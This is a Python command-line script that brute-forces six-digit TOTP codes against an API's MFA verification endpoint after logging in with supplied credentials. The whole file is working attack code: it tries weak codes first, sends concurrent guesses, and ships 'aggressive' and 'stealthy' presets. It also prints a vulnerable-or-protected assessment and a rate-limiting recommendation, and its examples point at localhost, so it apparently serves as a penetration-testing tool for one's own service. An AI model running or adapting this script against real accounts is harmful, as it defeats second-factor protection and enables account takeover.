#!/usr/bin/env python3
"""
MFA Brute-Force Attack Script
Tests MFA implementation by attempting to guess 6-digit TOTP codes.
"""

import argparse
import asyncio
import json
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()


class MFABruteForceAttack:
    """MFA brute-force attack against TOTP implementation"""

    def __init__(
        self,
        target: str,
        username: str,
        password: str,
        max_concurrent: int = 5,
        delay: float = 0.5,
        timeout: float = 10.0,
        code_range: tuple = (0, 999999),
    ):
        self.target = target
        self.login_url = target.rstrip("/") + "/auth/login"
        self.mfa_url = target.rstrip("/") + "/auth/mfa/verify"
        self.username = username
        self.password = password
        self.max_concurrent = max_concurrent
        self.delay = delay
        self.timeout = timeout
        self.code_range = code_range
        self.results = {
            "timestamp": datetime.utcnow().isoformat(),
            "target": target,
            "username": username,
            "total_attempts": 0,
            "successful_codes": [],
            "failed_attempts": 0,
            "rate_limited": 0,
            "challenge_expired": 0,
            "max_attempts_exceeded": 0,
        }

    async def obtain_mfa_challenge(
        self, client: httpx.AsyncClient
    ) -> Optional[Dict]:
        """Obtain MFA challenge by logging in"""
        try:
            response = await client.post(
                self.login_url,
                json={"username": self.username, "password": self.password},
                timeout=self.timeout,
            )

            if response.status_code == 200:
                data = response.json()
                if data.get("requires_mfa"):
                    return data
            return None
        except Exception as e:
            console.print(f"[red]Login error: {e}[/red]")
            return None

    async def attempt_mfa_code(
        self, client: httpx.AsyncClient, challenge_id: str, code: str
    ) -> Dict:
        """Attempt MFA verification with a specific code"""
        try:
            response = await client.post(
                self.mfa_url,
                json={"challenge_id": challenge_id, "code": code},
                timeout=self.timeout,
            )

            result = {
                "code": code,
                "status_code": response.status_code,
                "timestamp": datetime.utcnow().isoformat(),
            }

            if response.status_code == 200:
                result["outcome"] = "success"
                result["tokens"] = response.json()
                self.results["successful_codes"].append(code)
            elif response.status_code == 401:
                result["outcome"] = "failed"
                self.results["failed_attempts"] += 1
            elif response.status_code == 403:
                data = response.json()
                detail = data.get("detail", "")
                if "many" in detail.lower():
                    result["outcome"] = "max_attempts"
                    self.results["max_attempts_exceeded"] += 1
                else:
                    result["outcome"] = "blocked"
            elif response.status_code == 404:
                result["outcome"] = "expired"
                self.results["challenge_expired"] += 1
            elif response.status_code == 429:
                result["outcome"] = "rate_limited"
                self.results["rate_limited"] += 1
            else:
                result["outcome"] = "error"
                result["message"] = response.text

            return result

        except Exception as e:
            return {
                "code": code,
                "outcome": "error",
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat(),
            }

    async def run_brute_force(self, challenge_id: str, code_count: int = 100):
        """Run brute-force attack on MFA codes"""
        console.print(f"\n[cyan]Testing {code_count} MFA codes...[/cyan]")

        # Generate codes to test (prioritize common codes)
        codes_to_test = self.generate_code_list(code_count)
        self.results["total_attempts"] = len(codes_to_test)

        async with httpx.AsyncClient() as client:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
            ) as progress:
                task = progress.add_task("Testing codes...", total=len(codes_to_test))

                semaphore = asyncio.Semaphore(self.max_concurrent)

                async def limited_attempt(code):
                    async with semaphore:
                        result = await self.attempt_mfa_code(
                            client, challenge_id, code
                        )
                        progress.advance(task)

                        # Stop if successful or max attempts exceeded
                        if result["outcome"] in ["success", "max_attempts", "expired"]:
                            return result, True  # Stop signal

                        await asyncio.sleep(self.delay)
                        return result, False

                # Execute attempts
                for code in codes_to_test:
                    result, should_stop = await limited_attempt(code)

                    if result["outcome"] == "success":
                        console.print(
                            f"\n[bold green]✓ SUCCESS![/bold green] Valid MFA code found: [bold]{code}[/bold]"
                        )
                        break

                    if should_stop:
                        if result["outcome"] == "max_attempts":
                            console.print(
                                "\n[yellow]⚠ Max MFA attempts exceeded. Challenge locked.[/yellow]"
                            )
                        elif result["outcome"] == "expired":
                            console.print(
                                "\n[yellow]⚠ MFA challenge expired.[/yellow]"
                            )
                        break

    def generate_code_list(self, count: int) -> list:
        """Generate list of MFA codes to test (smart ordering)"""
        # Common/weak codes to try first
        common_codes = [
            "000000",
            "111111",
            "222222",
            "333333",
            "444444",
            "555555",
            "666666",
            "777777",
            "888888",
            "999999",
            "123456",
            "654321",
            "000001",
            "999998",
            "123123",
            "456456",
        ]

        # Add sequential codes
        codes = common_codes[:count]

        # Fill with random-ish codes if needed
        import random

        start, end = self.code_range
        remaining = count - len(codes)
        if remaining > 0:
            additional = random.sample(range(start, min(end + 1, start + 10000)), min(remaining, 10000))
            codes.extend([f"{c:06d}" for c in additional])

        return codes[:count]

    def run_attack(self, code_count: int = 100):
        """Execute MFA brute-force attack"""
        console.print("[bold cyan]MFA Brute-Force Attack[/bold cyan]")
        console.print(f"Target: {self.target}")
        console.print(f"Username: {self.username}\n")

        # Step 1: Obtain MFA challenge
        console.print("[cyan]Step 1: Obtaining MFA challenge...[/cyan]")

        async def get_challenge():
            async with httpx.AsyncClient() as client:
                return await self.obtain_mfa_challenge(client)

        challenge_data = asyncio.run(get_challenge())

        if not challenge_data:
            console.print(
                "[red]Failed to obtain MFA challenge. Check credentials.[/red]"
            )
            return

        challenge_id = challenge_data["challenge_id"]
        console.print(f"  ✓ Challenge obtained: {challenge_id}")

        # Step 2: Brute-force MFA codes
        console.print("\n[cyan]Step 2: Brute-forcing MFA codes...[/cyan]")
        console.print(
            f"  [dim]Testing {code_count} codes with {self.max_concurrent} concurrent requests[/dim]"
        )
        console.print(
            f"  [dim]Delay: {self.delay}s, Timeout: {self.timeout}s[/dim]\n"
        )

        asyncio.run(self.run_brute_force(challenge_id, code_count))

    def print_summary(self):
        """Print attack summary"""
        console.print("\n[bold green]Attack Summary[/bold green]")

        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan")
        table.add_column("Count", justify="right", style="yellow")

        table.add_row("Total Attempts", str(self.results["total_attempts"]))
        table.add_row(
            "Successful Codes", str(len(self.results["successful_codes"]))
        )
        table.add_row("Failed Attempts", str(self.results["failed_attempts"]))
        table.add_row("Rate Limited", str(self.results["rate_limited"]))
        table.add_row("Challenge Expired", str(self.results["challenge_expired"]))
        table.add_row(
            "Max Attempts Exceeded", str(self.results["max_attempts_exceeded"])
        )

        console.print(table)

        # Security assessment
        console.print("\n[bold]Security Assessment:[/bold]")

        if len(self.results["successful_codes"]) > 0:
            console.print(
                "  [red]✗ VULNERABLE:[/red] MFA code was successfully brute-forced!"
            )
            console.print(
                "  [yellow]Recommendation:[/yellow] Implement stricter rate limiting and attempt limits"
            )
        elif self.results["max_attempts_exceeded"] > 0:
            console.print(
                "  [green]✓ PROTECTED:[/green] Max MFA attempts limit is enforced"
            )
        elif self.results["challenge_expired"] > 0:
            console.print(
                "  [green]✓ PROTECTED:[/green] MFA challenge has appropriate TTL"
            )
        elif self.results["rate_limited"] > 0:
            console.print(
                "  [yellow]⚠ PARTIALLY PROTECTED:[/yellow] Rate limiting active but attack was not stopped"
            )
        else:
            console.print("  [blue]ℹ INFO:[/blue] Attack completed without finding valid code")

    def save_results(self):
        """Save attack results"""
        results_dir = Path(__file__).parent / "results"
        results_dir.mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = results_dir / f"mfa_bruteforce_{timestamp}.json"

        with open(filename, "w") as f:
            json.dump(self.results, f, indent=2)

        console.print(f"\n[dim]Results saved to: {filename}[/dim]")


def main():
    parser = argparse.ArgumentParser(
        description="MFA Brute-Force Attack Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack (test 100 codes)
  python mfa_bruteforce.py \\
    --target http://localhost:8000 \\
    --username admin \\
    --password admin123

  # Aggressive attack (test 500 codes, faster)
  python mfa_bruteforce.py \\
    --target http://localhost:8000 \\
    --username admin \\
    --password admin123 \\
    --code-count 500 \\
    --max-concurrent 10 \\
    --delay 0.1

  # Stealthy attack (slower, fewer concurrent)
  python mfa_bruteforce.py \\
    --target http://localhost:8000 \\
    --username admin \\
    --password admin123 \\
    --code-count 50 \\
    --max-concurrent 1 \\
    --delay 2.0
""",
    )

    parser.add_argument(
        "--target",
        required=True,
        help="Target API base URL (e.g., http://localhost:8000)",
    )
    parser.add_argument(
        "--username", required=True, help="Username for initial authentication"
    )
    parser.add_argument(
        "--password", required=True, help="Password for initial authentication"
    )
    parser.add_argument(
        "--code-count",
        type=int,
        default=100,
        help="Number of MFA codes to test (default: 100)",
    )
    parser.add_argument(
        "--max-concurrent",
        type=int,
        default=5,
        help="Maximum concurrent requests (default: 5)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay between requests in seconds (default: 0.5)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Request timeout in seconds (default: 10.0)",
    )

    args = parser.parse_args()

    attack = MFABruteForceAttack(
        target=args.target,
        username=args.username,
        password=args.password,
        max_concurrent=args.max_concurrent,
        delay=args.delay,
        timeout=args.timeout,
    )

    try:
        attack.run_attack(code_count=args.code_count)
        attack.print_summary()
        attack.save_results()
        return 0
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack interrupted by user[/yellow]")
        attack.print_summary()
        attack.save_results()
        return 1
    except Exception as e:
        console.print(f"\n[bold red]Error:[/bold red] {e}")
        import traceback

        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())

